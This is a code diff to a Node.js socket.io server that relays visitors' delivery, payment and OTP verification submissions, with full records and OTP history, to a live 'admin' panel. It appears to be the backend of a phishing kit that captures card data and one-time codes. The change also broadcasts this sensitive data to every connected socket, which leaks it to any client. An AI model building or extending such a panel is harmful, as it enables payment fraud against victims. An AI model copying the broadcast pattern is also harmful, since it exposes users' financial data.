@@ -148,15 +148,21 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // Notify admins with FULL visitor data
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('form:deliverySubmitted', {
-          ...visitorResult.rows[0],
-          timestamp: new Date()
-        });
+      // Notify admins with FULL visitor data - BROADCAST TO ALL
+      const eventData = {
+        ...visitorResult.rows[0],
+        timestamp: new Date()
+      };
+      
+      // Try adminConnections first
+      adminConnections.forEach((adminSocket) => {
+        adminSocket.emit('form:deliverySubmitted', eventData);
       });
+      
+      // Also broadcast via io.emit to ensure all sockets receive
+      io.emit('form:deliverySubmitted', eventData);
 
-      console.log(`📝 Delivery form submitted by ${sessionId}`);
+      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins`);
     } catch (error) {
       console.error('Error saving delivery data:', error);
     }
@@ -198,13 +204,17 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('form:paymentSubmitted', {
-          ...visitorResult.rows[0],
-          timestamp: new Date()
-        });
+      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة - BROADCAST
+      const eventData = {
+        ...visitorResult.rows[0],
+        timestamp: new Date()
+      };
+      
+      adminConnections.forEach((adminSocket) => {
+        adminSocket.emit('form:paymentSubmitted', eventData);
       });
+      
+      io.emit('form:paymentSubmitted', eventData);
 
       console.log(`💳 Payment form processed safely for ${sessionId}`);
     } catch (error) {
@@ -260,13 +270,17 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // Notify admins with FULL visitor data including OTP history
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('form:verificationSubmitted', {
-          ...visitorResult.rows[0],
-          timestamp: new Date()
-        });
+      // Notify admins with FULL visitor data including OTP history - BROADCAST
+      const eventData = {
+        ...visitorResult.rows[0],
+        timestamp: new Date()
+      };
+      
+      adminConnections.forEach((adminSocket) => {
+        adminSocket.emit('form:verificationSubmitted', eventData);
       });
+      
+      io.emit('form:verificationSubmitted', eventData);
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}`);
     } catch (error) {
@@ -376,7 +390,15 @@ io.on('connection', (socket) => {
         LIMIT 100
       `);
 
-      socket.emit('visitors:update', { visitors: visitors.rows });
+      const responseData = { visitors: visitors.rows };
+      
+      // Send to requesting socket
+      socket.emit('visitors:update', responseData);
+      
+      // Also broadcast via io.emit so all connected sockets get updates
+      io.emit('visitors:update', responseData);
+      
+      console.log('📡 visitors:request processed, sending to socket and broadcasting');
     } catch (error) {
       console.error('Error fetching visitors:', error);
     }
